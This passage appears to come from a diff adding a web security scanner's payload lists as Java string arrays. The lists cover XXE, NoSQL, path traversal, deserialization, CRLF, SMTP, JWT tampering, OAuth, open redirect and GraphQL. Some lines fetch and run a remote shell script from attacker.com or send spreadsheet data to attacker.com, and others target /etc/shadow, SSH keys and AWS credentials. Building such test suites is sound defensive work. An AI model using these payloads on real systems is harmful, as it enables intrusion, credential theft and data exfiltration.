+    "<?xml+version=\"1.0\"+encoding=\"UTF-7\"?>+ADw-+ACE-DOCTYPE+foo+[+ADw-+ACE-ENTITY+xxe+SYSTEM+\"file:///etc/passwd\"+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-+AC8-foo+AD4-"
+};
+
+// 4c. JSON Injection
+String[] JSON_INJECTION_PAYLOADS = {
+    "\",\"injected\":\"true\",\"a\":\"",
+    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
+    "\",\"admin\":true,\"test\":\"",
+    "\",\"isAdmin\":true,\"foo\":\"",
+    "\",\"$ne\":null,\"foo\":\"",
+    "\",\"$gt\":\"\",\"foo\":\"",
+    "\",\"role\":\"admin\",\"x\":\"",
+    "{\"$gt\":\"\"}",
+    "{\"$regex\":\".*\"}",
+    "{\"$ne\":null}"
+};
+
+// 4d. NoSQL Injection
+String[] NOSQL_INJECTION_PAYLOADS = {
+    // MongoDB injection
+    "true,+$where:+'1+==+1'",
+    "$ne=1",
+    "[$ne]=1",
+    "';+return+true;+var+dummy='",
+    "{\"$gt\":\"\"}",
+    "{\"$regex\":\".*\"}",
+    "{$ne:null}",
+    "'||1==1||'",
+    "'||a==a||'",
+    "{\"$where\":\"1==1\"}",
+    
+    // Advanced MongoDB operators
+    "{\"$nin\":[]}",
+    "{\"$exists\":true}",
+    "{\"$type\":2}",
+    "{\"$mod\":[1,0]}",
+    "{\"$all\":[]}",
+    "{\"$size\":0}",
+    "{\"$elemMatch\":{}}",
+    "{\"$not\":{\"$exists\":false}}",
+    
+    // MongoDB JavaScript injection
+    "\";return+true;var+foo=\"",
+    "';return+true;var+foo='",
+    "\";return+this.password.match(/.*/)//+,var+foo=\"",
+    "';sleep(5000);//",
+    "\";while(true){}//",
+    
+    // NoSQL Blind injection
+    "admin'+&&+this.password.match(/^a.*/)//",
+    "admin'+&&+this.password.length==8//",
+    "admin'+&&+this.password[0]=='a'//",
+    
+    // CouchDB injection
+    "{\"_id\":{\"$gt\":null}}",
+    "{\"_id\":{\"$gte\":\"\"}}",
+    
+    // Cassandra injection
+    "'+OR+1=1--",
+    "admin')||1==1#",
+    
+    // Redis injection  
+    "\\n*1\\r\\n$4\\r\\nkeys\\r\\n",
+    "\\n*1\\r\\n$8\\r\\nflushall\\r\\n"
+};
+
+// 4f. Path Traversal
+String[] PATH_TRAVERSAL_PAYLOADS = {
+    // Basic path traversal
+    "../",
+    "..%2f",
+    "..\\",
+    "..%5c",
+    "....//",
+    "....\\\\",
+    
+    // Absolute paths
+    "/etc/passwd",
+    "c:\\windows\\win.ini",
+    "/etc/shadow",
+    "/etc/hosts",
+    
+    // Double encoding
+    "..%252f",
+    "..%255c",
+    "%2e%2e%2f",
+    "%2e%2e%5c",
+    
+    // Overlong UTF-8 encoding
+    "..%c0%af",
+    "..%e0%80%af",
+    "..%c1%9c",
+    
+    // Null byte injection
+    "../../../etc/passwd%00",
+    "../../../etc/passwd%00.jpg",
+    "..%2f..%2f..%2fetc%2fpasswd%00",
+    
+    // Traversal with current directory
+    ".././.././.././etc/passwd",
+    ".../.../.../.../etc/passwd",
+    
+    // UNC paths (Windows)
+    "\\\\localhost\\c$\\windows\\win.ini",
+    "\\\\127.0.0.1\\c$\\boot.ini",
+    
+    // URL encoding variations
+    "../../../etc/passwd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "..\\..\\..\\windows\\win.ini",
+    
+    // Nested traversal
+    "..../.../.../etc/passwd",
+    "..\\\\..\\\\..\\\\windows\\\\win.ini",
+    
+    // Java-specific
+    "%c0%ae%c0%ae%c0%af",
+    "%c0%ae%c0%ae/",
+    
+    // Filter bypass
+    "..;/",
+    "..//",
+    "..\\;",
+    "..\\\\",
+    
+    // Zip slip
+    "../../../../../../tmp/evil.sh",
+    
+    // LFI to RCE - PHP Wrappers
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+    "php://input",  // Use with POST data: <?php system('id'); ?>
+    "php://stdin",
+    "expect://id",
+    "expect://ls",
+    
+    // Data wrapper for RCE
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",  // <?php system('id'); ?>
+    "data://text/plain,<?php system('id'); ?>",
+    "data:text/plain,<?php phpinfo(); ?>",
+    
+    // Zip wrapper for file upload to RCE
+    "zip://uploads/file.zip%23shell.php",
+    "zip:///var/www/html/uploads/file.zip%23shell.php",
+    
+    // Phar wrapper
+    "phar://uploads/file.phar/shell.php",
+    "phar:///var/www/html/uploads/file.phar",
+    
+    // Log poisoning paths
+    "/var/log/apache2/access.log",
+    "/var/log/apache/access.log",
+    "/var/log/nginx/access.log",
+    "/var/log/httpd/access_log",
+    "C:\\xampp\\apache\\logs\\access.log",
+    "C:\\wamp\\logs\\access.log",
+    "/usr/local/apache/logs/access_log",
+    "/var/log/mail",
+    "/var/log/vsftpd.log",
+    "/var/log/auth.log",
+    
+    // Session file inclusion
+    "/var/lib/php/sessions/sess_[SESSION_ID]",
+    "/tmp/sess_[SESSION_ID]",
+    "C:\\Windows\\Temp\\sess_[SESSION_ID]",
+    
+    // Proc filesystem (Linux)
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/stat",
+    "/proc/self/status",
+    "/proc/self/fd/0",
+    "/proc/self/fd/1",
+    "/proc/self/fd/2",
+    
+    // Sensitive files for exfiltration
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/hosts",
+    "/etc/hostname",
+    "/etc/mysql/my.cnf",
+    "/root/.bash_history",
+    "/root/.ssh/id_rsa",
+    "/home/user/.ssh/id_rsa",
+    "C:\\boot.ini",
+    "C:\\windows\\win.ini",
+    "C:\\windows\\system32\\drivers\\etc\\hosts",
+    
+    // Cloud credentials
+    "/home/user/.aws/credentials",
+    "/root/.aws/credentials",
+    "C:\\Users\\user\\.aws\\credentials"
+};
+
+// 4g. Deserialization Attacks
+String[] DESERIALIZATION_PAYLOADS = {
+    // Java deserialization
+    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcjuHHBpl1E+ymgIAA1sABWlBcmdzI",
+    
+    // PHP deserialization (Object injection)
+    "O:8:\"stdClass\":1:{s:4:\"test\";s:3:\"pwn\";}",
+    "a:1:{i:0;O:8:\"stdClass\":1:{s:4:\"test\";s:3:\"pwn\";}}",
+    "O:11:\"PDO\":0:{}",
+    
+    // Python pickle
+    "cos\\nsystem\\n(S'id'\\ntR.",
+    "c__builtin__\\neval\\n(S'__import__(\"os\").system(\"id\")'\\ntR.",
+    
+    // .NET deserialization
+    "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAAAACAAAAAH/////",
+    
+    // Ruby Marshal
+    "\\x04\\x08o:\\x0bObject\\x00",
+    
+    // YAML deserialization
+    "!!python/object/apply:os.system ['id']",
+    "!!python/object/apply:subprocess.check_output [['id']]",
+    "--- !ruby/object:Gem::Installer\\ni: x",
+    
+    // JSON with __proto__
+    "{\"__proto__\":{\"isAdmin\":true}}"
+};
+
+// 4h. CRLF Injection
+String[] CRLF_INJECTION_PAYLOADS = {
+    // Basic CRLF
+    "%0d%0aSet-Cookie:+admin=true",
+    "%0aSet-Cookie:+admin=true",
+    "%0dSet-Cookie:+admin=true",
+    "\\r\\nSet-Cookie:+admin=true",
+    "\\nSet-Cookie:+admin=true",
+    "\\rSet-Cookie:+admin=true",
+    
+    // Double encoding
+    "%0d%0a%0d%0a<script>alert(1)</script>",
+    "%250d%250aSet-Cookie:+admin=true",
+    
+    // HTTP Response Splitting
+    "%0d%0aContent-Length:+0%0d%0a%0d%0aHTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0aContent-Length:+25%0d%0a%0d%0a<script>alert(1)</script>",
+    
+    // Header injection
+    "%0d%0aLocation:+http://evil.com",
+    "%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html><script>alert(1)</script></html>",
+    
+    // Unicode encoded CRLF
+    "%E5%98%8A%E5%98%8DSet-Cookie:+admin=true",
+    "%C4%8D%C4%8ASet-Cookie:+admin=true",
+    
+    // Various line endings
+    "%0d%0a",
+    "%0a",
+    "%0d",
+    "\\r\\n",
+    "\\n",
+    "\\r",
+    
+    // Session fixation via CRLF
+    "%0d%0aSet-Cookie:+sessionid=malicious",
+    
+    // Cache poisoning via CRLF
+    "%0d%0aX-Forwarded-Host:+evil.com"
+};
+
+// 4i. Mass Assignment / Parameter Binding
+String[] MASS_ASSIGNMENT_PAYLOADS = {
+    // Common privilege escalation attributes
+    "isAdmin",
+    "is_admin",
+    "admin",
+    "role",
+    "user_role",
+    "roles",
+    "permissions",
+    "access_level",
+    "privilege",
+    "is_superuser",
+    "superuser",
+    "verified",
+    "is_verified",
+    "approved",
+    "is_approved",
+    "active",
+    "is_active",
+    "enabled",
+    "is_enabled",
+    
+    // User modification
+    "user_id",
+    "userId",
+    "id",
+    "account_id",
+    "accountId",
+    "email",
+    "username",
+    "password",
+    
+    // Payment/Financial
+    "price",
+    "cost",
+    "amount",
+    "balance",
+    "credits",
+    "discount",
+    "total",
+    "paid",
+    "isPaid",
+    
+    // Object properties
+    "created_at",
+    "updated_at",
+    "deleted_at",
+    "__class__",
+    "__proto__",
+    "constructor",
+    "prototype"
+};
+
+// 4j. Prototype Pollution
+String[] PROTOTYPE_POLLUTION_PAYLOADS = {
+    // Basic prototype pollution
+    "{\"__proto__\":{\"admin\":true}}",
+    "{\"__proto__\":{\"isAdmin\":true}}",
+    "{\"constructor\":{\"prototype\":{\"admin\":true}}}",
+    
+    // Nested pollution
+    "{\"__proto__\":{\"__proto__\":{\"admin\":true}}}",
+    
+    // Array-based
+    "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+    
+    // Via URL parameters (for parameter pollution)
+    "__proto__[admin]=true",
+    "__proto__.admin=true",
+    "constructor.prototype.admin=true",
+    "constructor[prototype][admin]=true",
+    
+    // Deep merge pollution
+    "{\"a\":{\"b\":{\"__proto__\":{\"polluted\":true}}}}",
+    
+    // Via array indices
+    "arr[__proto__][admin]=true"
+};
+
+// 4n. HTML Injection (Separate from XSS for clickjacking/phishing)
+String[] HTML_INJECTION_PAYLOADS = {
+    // Basic HTML injection
+    "<h1>Injected Heading</h1>",
+    "<iframe src=\"http://attacker.com\"></iframe>",
+    "<img src=\"http://attacker.com/logo.png\">",
+    "<a href=\"http://attacker.com\">Click Here</a>",
+    
+    // Form injection for phishing
+    "<form action=\"http://attacker.com/steal\" method=\"POST\"><input name=\"password\" type=\"password\"><input type=\"submit\"></form>",
+    "<form action=\"javascript:alert(1)\"><input type=\"submit\"></form>",
+    
+    // Clickjacking / UI redressing
+    "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;\">Fake Content</div>",
+    "<iframe src=\"http://legitimate-bank.com\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe>",
+    
+    // Meta tag injection
+    "<meta http-equiv=\"refresh\" content=\"0;url=http://attacker.com\">",
+    "<meta name=\"description\" content=\"Injected SEO content\">",
+    
+    // Link injection for SEO poisoning
+    "<link rel=\"canonical\" href=\"http://attacker.com\">",
+    "<link rel=\"stylesheet\" href=\"http://attacker.com/evil.css\">",
+    
+    // Base tag hijacking
+    "<base href=\"http://attacker.com/\">",
+    
+    // Defacement
+    "<body style=\"background:black;color:red;\"><h1>Hacked!</h1></body>",
+    "<marquee>Scrolling injected text</marquee>",
+    
+    // Hidden content
+    "<div style=\"display:none;\">Hidden malicious content</div>",
+    "<!-- Injected comment with sensitive data -->",
+    
+    // Audio/Video injection
+    "<audio src=\"http://attacker.com/sound.mp3\" autoplay></audio>",
+    "<video src=\"http://attacker.com/video.mp4\" autoplay></video>"
+};
+
+// 4o. CSV Injection (Excel Formula Injection)
+String[] CSV_INJECTION_PAYLOADS = {
+    // Formula injection
+    "=1+2",
+    "=1+1+cmd|' /C calc'!A0",
+    "=cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A0",
+    
+    // Different formula prefixes
+    "=SUM(1+1)",
+    "+1+1",
+    "-1+1",
+    "@SUM(1+1)",
+    
+    // Command execution via formulas
+    "=2+5+cmd|'/c calc'!A0",
+    "=HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click me\")",
+    
+    // DDE (Dynamic Data Exchange) exploitation
+    "=cmd|'/c powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAGUAYgBDAGwAaQBlAG4AdAA'!A0",
+    "@SUM(1+1)*cmd|'/c calc'!A0",
+    
+    // Data exfiltration
+    "=HYPERLINK(CONCATENATE(\"http://attacker.com/?\",A1),\"Click\")",
+    "=IMPORTXML(CONCAT(\"http://attacker.com/?\",A1),\"//\")",
+    
+    // LibreOffice/OpenOffice specific
+    "=WEBSERVICE(\"http://attacker.com/\"&A1)",
+    
+    // Macro execution
+    "=EXEC(\"calc\")",
+    
+    // CSV with special characters
+    "\",=1+1,\"",
+    "\"=1+1\"",
+    "',=1+1,'",
+    
+    // Tab/Newline injection
+    "test\t=1+1",
+    "test\n=1+1"
+};
+
+// 4p. SMTP Header Injection
+String[] SMTP_HEADER_INJECTION_PAYLOADS = {
+    // BCC injection
+    "%0aBcc:attacker@evil.com",
+    "%0dBcc:attacker@evil.com",
+    "%0d%0aBcc:attacker@evil.com",
+    "\\r\\nBcc:attacker@evil.com",
+    "\\nBcc:attacker@evil.com",
+    
+    // CC injection
+    "%0aCc:attacker@evil.com",
+    "%0d%0aCc:attacker@evil.com",
+    
+    // Additional recipients
+    "%0aTo:attacker@evil.com",
+    "%0d%0aTo:attacker@evil.com",
+    
+    // Subject manipulation
+    "%0aSubject:Injected Subject",
+    "%0d%0aSubject:Phishing Email",
+    
+    // Content-Type manipulation for HTML emails
+    "%0aContent-Type:text/html",
+    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><h1>Phishing</h1></body></html>",
+    
+    // Message body injection
+    "%0d%0a%0d%0aInjected email body",
+    "\\r\\n\\r\\nInjected message content",
+    
+    // Multiple header injection
+    "%0aBcc:attacker@evil.com%0aCc:victim@company.com",
+    "%0d%0aBcc:attacker@evil.com%0d%0aSubject:Malicious",
+    
+    // Attachment injection
+    "%0aContent-Disposition:attachment;filename=\"malware.exe\"",
+    
+    // MIME boundary manipulation
+    "%0aContent-Type:multipart/mixed;boundary=evil",
+    
+    // Priority manipulation
+    "%0aX-Priority:1",
+    "%0aImportance:high",
+    
+    // Reply-To injection
+    "%0aReply-To:attacker@evil.com",
+    
+    // Sender spoofing
+    "%0aFrom:ceo@company.com",
+    
+    // Null byte bypass
+    "%00%0aBcc:attacker@evil.com",
+    
+    // Unicode/UTF-7 encoding
+    "%E5%98%8A%E5%98%8DBcc:attacker@evil.com"
+};
+
+// ############################################################
+// ############################################################
+// ##                                                        ##
+// ##  PART 2: PER-REQUEST TEST PAYLOADS                    ##
+// ##  (These tests run ONCE per request)                   ##
+// ##                                                        ##
+// ############################################################
+// ############################################################
+
+// ============================================================
+// CATEGORY 5: AUTHENTICATION & SESSION MANAGEMENT
+// ============================================================
+
+// 5a. JWT Tampering
+String[] JWT_TAMPERING_PAYLOADS = {
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+    "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiYWRtaW4ifQ."
+};
+
+// 5b. JWT Algorithm Confusion & Advanced Attacks
+String[] JWT_ALGORITHM_CONFUSION_PAYLOADS = {
+    // Algorithm set to "none"
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    
+    // RSA to HMAC confusion (if server uses RSA public key as HMAC secret)
+    // Note: Actual payload depends on signing with server's public key as HMAC secret
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.[signature_with_public_key_as_secret]",
+    
+    // JKU (JWT Set URL) header injection
+    "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vand0In0.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvandrcyJ9.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    
+    // X5U (X.509 URL) header injection
+    "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydCJ9.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    
+    // Kid (Key ID) injection
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL3B1YmxpYy9jc3Mvc3R5bGUuY3NzIn0.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiJhZG1pbiJ9.",
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6IiJ9.eyJzdWIiOiJhZG1pbiJ9.[signature_with_empty_secret]",
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6InNxbGk6IC0tIn0.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    
+    // JWT confusion with symmetrical key
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwic3ViIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.[weak_signature]",
+    
+    // Algorithm case manipulation
+    "eyJhbGciOiJoczI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    "eyJhbGciOiJIczI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    
+    // Empty/Null algorithm
+    "eyJhbGciOiIiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiJ9.",
+    "eyJhbGciOm51bGwsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.",
+    
+    // Kid SQL injection
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEtdW5pb24tc2VsZWN0LW51bGwtZnJvbS1rZXlzIn0.eyJzdWIiOiJhZG1pbiJ9.[signature]",
+    
+    // Kid command injection
+    "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEmJndob2FtaSJ9.eyJzdWIiOiJhZG1pbiJ9.[signature]"
+};
+
+// 5c. Token Removal/Tampering
+String[] AUTH_HEADER_TESTS = {
+    "",
+    "null",
+    "undefined",
+    "Bearer",
+    "Bearer+",
+    "Bearer+null",
+    "Bearer+undefined",
+    "Basic+YWRtaW46YWRtaW4=",
+    "Basic+YWRtaW46cGFzc3dvcmQ=",
+    "Bearer+invalidtoken123",
+    "Bearer+eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+    "ApiKey+test123",
+    "Token+expired",
+    "OAuth+invalid"
+};
+
+// 5c. Weak/Default Credentials
+String[] WEAK_CREDENTIALS = {
+    "admin:admin",
+    "admin:password",
+    "admin:123456",
+    "root:root",
+    "test:test",
+    "user:user",
+    "administrator:administrator",
+    "guest:guest",
+    "admin:admin123",
+    "demo:demo"
+};
+
+// Auth Headers to test
+String[] AUTH_HEADERS = {
+    "Authorization",
+    "X-Auth-Token",
+    "X-API-Key",
+    "API-Key",
+    "X-Access-Token",
+    "Access-Token",
+    "Token",
+    "X-Token",
+    "Bearer-Token",
+    "Session-Token"
+};
+
+// 5d. 2FA/MFA Bypass Techniques
+String[] TWO_FA_BYPASS_PAYLOADS = {
+    // OTP values to test
+    "000000",
+    "111111",
+    "123456",
+    "000001",
+    "999999",
+    "012345",
+    
+    // Empty/Null bypass
+    "",
+    "null",
+    " ",
+    
+    // Array manipulation
+    "['000000','111111']",
+    "{\"otp\":[\"000000\",\"111111\"]}",
+    
+    // Boolean bypass
+    "true",
+    "false",
+    "1",
+    "0",
+    
+    // Negative values
+    "-1",
+    "-000000",
+    
+    // SQL injection in OTP
+    "' OR '1'='1",
+    "admin'--",
+    
+    // NoSQL injection
+    "{\"$ne\":null}",
+    "{\"$gt\":\"\"}",
+    
+    // Overflow
+    "9999999999999999",
+    
+    // Response manipulation testing (requires manual inspection)
+    // Note: These are conceptual - actual testing requires intercepting responses
+};
+
+// 5e. OAuth/OIDC Attacks
+String[] OAUTH_OIDC_PAYLOADS = {
+    // redirect_uri manipulation
+    "http://attacker.com",
+    "http://legitimate-site.com@attacker.com",
+    "http://legitimate-site.com.attacker.com",
+    "http://attacker.com?legitimate-site.com",
+    "http://attacker.com#legitimate-site.com",
+    "http://legitimate-site.com/callback/../../../attacker.com",
+    
+    // Open redirect via redirect_uri
+    "http://legitimate-site.com/redirect?url=http://attacker.com",
+    
+    // Subdomain takeover
+    "http://old-subdomain.legitimate-site.com",
+    
+    // Path traversal in redirect_uri
+    "http://legitimate-site.com/callback/../../attacker-path",
+    
+    // Localhost/Internal redirect
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://[::1]",
+    
+    // Protocol manipulation
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    
+    // State parameter manipulation (test by removing or modifying)
+    "",  // Empty state
+    "null",
+    "predictable123",
+    
+    // Scope manipulation
+    "openid profile email admin",
+    "read write delete admin",
+    "*",
+    "../admin",
+    
+    // Response type confusion
+    "code+token",
+    "code+id_token",
+    "token+id_token",
+    
+    // PKCE bypass attempts
+    "",  // Empty code_verifier
+    "a",  // Short verifier
+    
+    // Client ID enumeration
+    "1",
+    "2",
+    "admin",
+    "test",
+    
+    // Nonce manipulation
+    "",  // Empty nonce
+    "reused-nonce-123"
+};
+
+// ============================================================
+// CATEGORY 6: AUTHORIZATION & PRIVILEGE ESCALATION
+// ============================================================
+
+// 6f. Open Redirect Payloads
+String[] OPEN_REDIRECT_PAYLOADS = {
+    "//evil.com",
+    "https://evil.com",
+    "http://evil.com",
+    "/\\evil.com",
+    "//evil.com/%2f..",
+    "///evil.com",
+    "////evil.com",
+    "https:evil.com",
+    "http:evil.com",
+    "%2f%2fevil.com",
+    "%2f%5cevil.com",
+    "%00//evil.com",
+    "//evil%00.com",
+    "https://evil.com/..;/",
+    "//evil.com@legitimate-site.com",
+    "https://legitimate-site.com.evil.com",
+    "//evil.com%23.legitimate-site.com",
+    "https://evil.com?legitimate-site.com",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>"
+};
+
+// 6a. Privilege Escalation Headers
+String[] PRIVILEGE_ESCALATION_PAYLOADS = {
+    "admin=true",
+    "role=admin",
+    "isAdmin=true",
+    "is_admin=1",
+    "user_role=administrator",
+    "access_level=9999",
+    "privilege=superuser",
+    "group=administrators",
+    "permissions=all",
+    "authenticated=true",
+    "verified=true",
+    "approved=true"
+};
+
+// ============================================================
+// CATEGORY 10: ADVANCED ATTACKS
+// ============================================================
+
+// 10a. GraphQL Introspection
+String[] GRAPHQL_INTROSPECTION_PAYLOADS = {
+    // Introspection queries
+    "{__schema{types{name,fields{name}}}}",
+    "{__type(name:\"Query\"){fields{name,args{name,type{name}}}}}",
+    "{__schema{queryType{name},mutationType{name},subscriptionType{name}}}",
+    
+    // Query suggestions
+    "query{__typename}",
+    
+    // Full introspection
+    "query+IntrospectionQuery+{__schema+{queryType+{+name+}+mutationType+{+name+}+types+{+...FullType+}+directives+{+name+description+locations+args+{+...InputValue+}+}+}+}+fragment+FullType+on+__Type+{+kind+name+description+fields(includeDeprecated:+true)+{+name+description+args+{+...InputValue+}+type+{+...TypeRef+}+isDeprecated+deprecationReason+}+inputFields+{+...InputValue+}+interfaces+{+...TypeRef+}+enumValues(includeDeprecated:+true)+{+name+description+isDeprecated+deprecationReason+}+possibleTypes+{+...TypeRef+}+}+fragment+InputValue+on+__InputValue+{+name+description+type+{+...TypeRef+}+defaultValue+}+fragment+TypeRef+on+__Type+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+ofType+{+kind+name+}+}+}+}+}+}+}+}"
+};
+
+// 10a. GraphQL Batching (continued)
+String[] GRAPHQL_BATCHING_PAYLOADS = {
+    // Query batching for DoS
+    "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]",
+    "[{\"query\":\"query{user(id:1){name}}\"},{\"query\":\"query{user(id:2){name}}\"},{\"query\":\"query{user(id:3){name}}\"}]"
+};
+
+// 10a. GraphQL DoS (continued)
+String[] GRAPHQL_DOS_PAYLOADS = {
+    // Circular query (depth attack)
+    "query{user{posts{author{posts{author{posts{author{posts{author{posts{author{name}}}}}}}}}}}}}",
+    
+    // Field duplication
+    "query{user{name+name+name+name+name+name+name+name+name+name}}",
+    
+    // Alias abuse
+    "query{a:__typename+b:__typename+c:__typename+d:__typename+e:__typename}"
+};
+
+// 10a. GraphQL Injection (continued)
+String[] GRAPHQL_INJECTION_PAYLOADS = {
+    // SQL injection in GraphQL
+    "query{user(id:\"1'+OR+'1'='1\"){name}}",
+    
+    // NoSQL injection
+    "query{user(id:\"{$ne:null}\"){name}}",
+    
+    // XSS in GraphQL
+    "mutation{updateUser(name:\"<script>alert(1)</script>\"){id}}"
+};
+
+// 10b. HTTP Request Smuggling
+String[] REQUEST_SMUGGLING_PAYLOADS = {
+    // CL.TE (Content-Length to Transfer-Encoding)
